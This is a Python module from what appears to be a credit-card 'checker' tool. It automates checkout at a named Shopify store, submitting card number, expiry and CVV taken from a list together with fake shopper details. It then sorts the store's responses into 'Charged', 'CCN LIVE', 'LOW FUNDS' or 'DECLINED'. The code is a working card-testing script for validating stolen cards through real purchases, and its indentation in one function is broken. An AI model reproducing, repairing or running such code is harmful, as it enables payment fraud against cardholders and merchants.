import os
import time
# from .rand_user import random_user_api
from ..filters.checker_defs import find_between

def one(r):
    a = r.get('https://asuvi.com.au/products/personalised-bamboo-toothbrush')
    b_headers = {
'authority': 'asuvi.com.au',
'method': 'POST',
'path': '/cart/add.js',
'scheme': 'https',
'accept': 'application/json, text/javascript, */*; q=0.01',
'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
'cache-control': 'no-cache',
'content-length': '221686',
'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryCW08A5SVx3Hf89dm',
'origin': 'https://asuvi.com.au',
'referer': 'https://asuvi.com.au/products/personalised-bamboo-toothbrush',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Windows"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
}
    with open('text_files/sha_a2c.txt', 'rb') as fileFp:
        fileInfoDict = {
        "file": fileFp,
    }
        b = r.post('https://asuvi.com.au/cart/add.js', files = fileInfoDict, headers = b_headers)
        if b.status_code != 200: return False
    d_post = {
'updates[]': '1',
'note': '',
'checkout': 'Check out',
'attributes[how-did-you-hear-about-us]': 'A Friend',
'attributes[how-did-you-hear-about-us-other]': '',
}

    d = r.post('https://asuvi.com.au/cart', d_post)
    # with open('d.html', 'w', encoding='utf-8') as wr: wr.write(d.text)
    # sho_auth= find_between(d.text, 'name="shopify-checkout-authorization-token" content="', '"')
    auth_token = find_between(d.text, 'type="hidden" name="authenticity_token" value="','"')
    # checkout_id= find_between(d.text,'"checkoutToken":"','"')
    url = d.url
    return (auth_token, url) if auth_token else False




def two(r,url,auth_token, rand_user):
    e_data = {
'_method': 'patch',
'authenticity_token': auth_token,
'previous_step': 'contact_information',
'step': 'shipping_method',
'checkout[email]': rand_user.email,
'checkout[buyer_accepts_marketing]': '0',
'checkout[shipping_address][first_name]': rand_user.first_name,
'checkout[shipping_address][last_name]': rand_user.last_name,
'checkout[shipping_address][company]': rand_user.name,
'checkout[shipping_address][address1]': '3 allen street',
'checkout[shipping_address][address2]': '',
'checkout[shipping_address][city]': 'New York',
'checkout[shipping_address][country]': 'US',
'checkout[shipping_address][province]': 'NY',
'checkout[shipping_address][zip]': '10002',
'checkout[shipping_address][phone]': rand_user.phone,
'checkout[shipping_address][first_name]': rand_user.first_name,
'checkout[shipping_address][last_name]': rand_user.last_name,
'checkout[shipping_address][company]': rand_user.name,
'checkout[shipping_address][address1]': '3 allen street',
'checkout[shipping_address][address2]': '',
'checkout[shipping_address][city]': 'New York',
'checkout[shipping_address][country]': 'United States',
'checkout[shipping_address][province]': 'NY',
'checkout[shipping_address][zip]': '10002',
'checkout[shipping_address][phone]': '',
'checkout[client_details][browser_width]': '615',
'checkout[client_details][browser_height]': '667',
'checkout[client_details][javascript_enabled]': '1',
'checkout[client_details][color_depth]': '24',
'checkout[client_details][java_enabled]': 'false',
'checkout[client_details][browser_tz]': '-330',
}
    e = r.post(url, data = e_data)
    if e.status_code != 200:
        return False
    f_data = {
'_method': 'patch',
'authenticity_token': auth_token,
'previous_step': 'shipping_method',
'step': 'payment_method',
'checkout[shipping_rate][id]': 'shopify-Standard%20Int.-7.50',
'checkout[client_details][browser_width]': '632',
'checkout[client_details][browser_height]': '667',
'checkout[client_details][javascript_enabled]': '1',
'checkout[client_details][color_depth]': '24',
'checkout[client_details][java_enabled]': 'false',
'checkout[client_details][browser_tz]': '-330',
}
    g = r.post(url, data = f_data)
    if g.status_code != 200:
        return False
    h = r.get(g.url)
    if h.status_code != 200:
        return False
    payment_gateway = find_between(h.text,'data-subfields-for-gateway="','"')
    return False if not payment_gateway else payment_gateway


def three(r, payment_gateway, lista, rand_user,auth_token, url):
    cc,mes,ano,cvv = lista
        json_four = {
        "credit_card": {
            "number": cc,
            "name": rand_user.name,
            "month": mes,
            "year": ano,
            "verification_value": cvv
        },
        "payment_session_scope": "asuvi.com.au"
    }

    four = r.post('https://deposit.us.shopifycs.com/sessions', json = json_four)
    if 'id' not in four.json(): return False
        g_data = {
    '_method': 'patch',
    'authenticity_token': auth_token,
    'previous_step': 'payment_method',
    'step': '',
    's': four.json()['id'],
    'checkout[payment_gateway]': payment_gateway,
    'checkout[credit_card][vault]': 'false',
    'checkout[different_billing_address]': 'false',
    'checkout[remember_me]': 'false',
    'checkout[remember_me]': '0',
    'checkout[vault_phone]': '',
    'checkout[total_price]': '1850',
    'complete': '1',
    'checkout[client_details][browser_width]': '615',
    'checkout[client_details][browser_height]': '667',
    'checkout[client_details][javascript_enabled]': '1',
    'checkout[client_details][color_depth]': '24',
    'checkout[client_details][java_enabled]': 'false',
    'checkout[client_details][browser_tz]': '-330',
    }
    g = r.post(url, data = g_data)
    if g.status_code != 200:
        return False
    time.sleep(4)
    h = r.get(f'{g.url}?from_processing_page=1')
    if h.status_code != 200:
        return False
    i = r.get(f'{h.url}&validate=true')
    return False if i.status_code != 200 else i.text



def get_response_sha(text):
    if 'Thank you' in text or 'Your order is confirmed' in text:
        r_text, r_logo, r_respo = "Charged $18", "✅", 'Charged'
        return r_text, r_logo, r_respo,
    text1 = find_between(text, '<p class="notice__text">','</p></div></div>')
    text = text1 if text1 else text
    if 'ZIP code does not match billing address' in text or "2059" in text or "2060" in text :
        r_text, r_logo, r_respo = "ZIP INCORRECT", "✅", 'Charged'
    elif "2001"  in text:
        r_text, r_logo, r_respo = "LOW FUNDS", "✅", 'Charged'
    elif "Security code was not matched by the processor" in text:
        r_text, r_logo, r_respo = "CCN LIVE", "✅", 'CCN Match'
    elif '"seller_message": "Payment complete."' in text or '"cvc_check": "pass"' in text or 'thank_you' in text or '"type":"one-time"' in text or '"state": "succeeded"' in text or "Your payment has already been processed" in text or '"status": "succeeded"' in text or 'Thank' in text:
        r_text, r_logo, r_respo = "Charged $18", "✅", 'Charged'
    else:
        r_text, r_logo, r_respo = "DECLINED", "❌", 'Rejected'
    r_text1 = text1.replace('-','') if text1 else r_text
    return r_text1,r_logo,r_respo